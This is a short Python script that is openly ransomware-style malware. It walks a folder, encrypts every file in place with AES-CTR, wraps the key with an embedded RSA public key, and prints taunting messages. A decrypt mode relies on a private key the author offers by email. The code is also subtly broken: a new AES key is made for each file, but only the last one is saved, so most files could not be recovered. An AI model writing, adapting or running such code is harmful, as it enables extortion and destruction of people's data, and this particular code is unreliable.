from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto import Random
import os

aes_key = None
aes_key_encrypted = None

RSA_public_key = b'''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2vAJa6NRCcz/Xf57tg4x
QTep1DSSntVs1wyoN08pYSlnEyegWmaGLcwk1yiMPN9Y3JhW7IMfnI/mrddb7boi
SmoQDN9UHX015job2RJowkGZmyBaSWDwH/iOXhx2ek8JK0NCvbYhLkzHMkfx7Uro
Zao/GX9sPsbye1qEL1HQR1sTmlsBcn5pdwJliKN/eCaQTPhI4CSN77KvNWvDhgiR
lv+OHWxgN9z/vL7Fp6cJRLXrqhcyfWTCDRgq2caBZxcfWNjHCeG/Px6aAeD7KylZ
y0R37RXonYAFhRGwn33HoFGCs91j/I/vGl8JKW9UN7knv+wXH+kgqSbqwujZJuGH
IwIDAQAB
-----END PUBLIC KEY-----'''


def func_enc(fullpath):
    global aes_key, aes_key_encrypted

    aes_key = Random.get_random_bytes(16)

    key = RSA.import_key(RSA_public_key)
    c = PKCS1_OAEP.new(key)

    aes_key_encrypted = c.encrypt(aes_key)

    counter_enc = Counter.new(128, initial_value=1)
    cipher_enc = AES.new(aes_key, AES.MODE_CTR, counter=counter_enc)

    with open(fullpath, 'rb+') as f:
        data = f.read()
        f.seek(0)

        encrypted = cipher_enc.encrypt(data)
        f.write(encrypted)
        f.truncate()

    with open(r"C:\Users\HP 820 G3\Desktop\key.txt", "wb") as f:
        f.write(aes_key_encrypted)



def func_dec(fullpath, private_key):

    global aes_key_encrypted

    with open(r"C:\Users\HP 820 G3\Desktop\key.txt", "rb") as f:
        aes_key_encrypted = f.read()

    if aes_key_encrypted is None:
        print("ERROR: Run encryption first in the same session")
        return

    rsa_key = RSA.import_key(private_key)
    c = PKCS1_OAEP.new(rsa_key)

    aes_key_decrypted = c.decrypt(aes_key_encrypted)

    counter_dec = Counter.new(128, initial_value=1)
    cipher_dec = AES.new(aes_key_decrypted, AES.MODE_CTR, counter=counter_dec)

    with open(fullpath, 'rb+') as f:
        data = f.read()
        f.seek(0)

        decrypted = cipher_dec.decrypt(data)
        f.write(decrypted)
        f.truncate()



mode = "enc"  

folder = r"C:\Users\HP 820 G3\Desktop\test"
#If you need the file containing the RSA private key, please feel free to contact me via email.
private_key = open(r"C:\Users\HP 820 G3\Desktop\private.txt", "rb").read()

for root, subdir, files in os.walk(folder):
    for file in files:
        fullpath = os.path.join(root, file)

        if mode == "enc":
            func_enc(fullpath)
            print("💀 YOU ARE COOKED 💀")
            print("⚠️ F4RAG WAS HERE ⚠️")

        else:
            func_dec(fullpath, private_key)
            print("Sorry for the inconvenience. Thank you for your time. 😊")